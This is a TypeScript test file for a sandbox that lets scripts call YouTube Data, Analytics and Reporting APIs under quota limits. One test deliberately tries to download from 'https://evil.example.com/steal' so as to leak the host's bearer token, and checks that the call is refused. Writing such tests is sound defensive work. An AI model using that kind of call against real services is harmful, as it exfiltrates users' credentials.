import { afterAll, beforeAll, expect, it } from "vitest";
import type { Bridge } from "../src/host/bridge.js";
import { execute } from "../src/host/execute.js";
import { startTestHost, type FakeRequest } from "./host.js";

let host: Awaited<ReturnType<typeof startTestHost>>;
let bridge: Bridge;
let googleRequests: FakeRequest[];

beforeAll(async () => {
  host = await startTestHost(({ url }) => {
    if (url.includes("youtubeanalytics")) {
      return Response.json({ columnHeaders: [{ name: "day", columnType: "DIMENSION", dataType: "STRING" }, { name: "views", columnType: "METRIC", dataType: "INTEGER" }], rows: [["2026-10-01", 3]] });
    }
    if (url.includes("youtubereporting.googleapis.com/v1/media")) return new Response("date,views\n" + "x".repeat(100), { headers: { "content-type": "text/csv" } });
    if (url.includes("/search")) {
      return new Response(JSON.stringify({ error: { code: 400, message: "Bad q", errors: [{ reason: "badRequest" }] } }), { status: 400 });
    }
    return Response.json({ items: [{ id: "UC1", snippet: { title: "My Channel" } }] });
  });
  bridge = host.bridge;
  googleRequests = host.requests;
});
afterAll(() => host.close());

it("calls the Data API from sandbox code with the host's token and charges quota", async () => {
  const out = await execute(
    bridge,
    `const r = await yt.data.channels.list({ part: "snippet", mine: true }); return { title: r.items[0].snippet.title, quota: (await yt.quota()).units }`,
  );
  expect(out).toEqual({ ok: true, result: { title: "My Channel", quota: { used: 1, remaining: 9999, limit: 10000 } }, logs: [] });
  expect(googleRequests.at(-1)).toMatchObject({ url: "https://youtube.googleapis.com/youtube/v3/channels?part=snippet&mine=true", auth: "Bearer tok" });
});

it("surfaces Google errors with status and reason", async () => {
  const out = await execute(bridge, `try { await yt.data.search.list({ part: "snippet", q: "x" }) } catch (e) { return [e.status, e.reason, e.message] }`);
  expect(out).toEqual({ ok: true, result: [400, "badRequest", "Bad q"], logs: [] });
});

it("rejects bad params before any request or quota charge", async () => {
  const before = googleRequests.length;
  const out = await execute(bridge, `return yt.data.videos.list({ id: "x" })`);
  expect(out).toMatchObject({ ok: false, error: { reason: "invalidParams", message: "youtube.videos.list requires part." } });
  expect(googleRequests.length).toBe(before);
});

it("names close matches for an unknown method", async () => {
  const out = await execute(bridge, `return yt.data.video.list({ part: "id" })`);
  expect(out).toMatchObject({ ok: false, error: { reason: "unknownMethod", message: expect.stringContaining("youtube.videos.list") } });
});

it("runs analytics.query with defaults and returns row objects without charging Data API quota", async () => {
  const before = (await execute(bridge, "return (await yt.quota()).units.used")) as { result: number };
  const out = await execute(bridge, `return yt.analytics.query({ metrics: "views", dimensions: "day" })`);
  expect(out).toMatchObject({ ok: true, result: { rows: [{ day: "2026-10-01", views: 3 }] } });
  const url = new URL(googleRequests.at(-1)!.url);
  expect(url.origin + url.pathname).toBe("https://youtubeanalytics.googleapis.com/v2/reports");
  expect(url.searchParams.get("ids")).toBe("channel==MINE");
  expect(url.searchParams.get("startDate")).toMatch(/^\d{4}-\d{2}-\d{2}$/);
  expect(await execute(bridge, "return (await yt.quota()).units.used")).toMatchObject({ result: before.result });
});

it("downloads a reporting CSV with the host token and caps its size", async () => {
  const out = await execute(bridge, `return yt.reporting.download("https://youtubereporting.googleapis.com/v1/media/CHANNEL/r1?alt=media", { maxChars: 20 })`);
  expect(out).toEqual({ ok: true, result: { csv: "date,views\nxxxxxxxxx", totalChars: 111, truncated: true }, logs: [] });
  expect(googleRequests.at(-1)?.auth).toBe("Bearer tok");
});

it("refuses to send the token to a non-Reporting URL", async () => {
  const before = googleRequests.length;
  const out = await execute(bridge, `return yt.reporting.download("https://evil.example.com/steal")`);
  expect(out).toMatchObject({ ok: false, error: { reason: "invalidParams" } });
  expect(googleRequests.length).toBe(before);
});

it("stops a run at its quotaBudget before sending the call that would cross it", async () => {
  const before = googleRequests.length;
  const out = await execute(
    bridge,
    `let n = 0;
     try { for (;;) { await yt.data.videos.list({ part: "id", id: "v" }); n++; } }
     catch (e) { return { n, reason: e.reason, details: e.details } }`,
    { timeoutMs: 10_000, maxCalls: 50, quotaBudget: 3 },
  );
  expect(out).toEqual({ ok: true, result: { n: 3, reason: "quotaBudgetExceeded", details: { spent: 3, budget: 3, cost: 1 } }, logs: [] });
  expect(googleRequests.length - before).toBe(3);
});
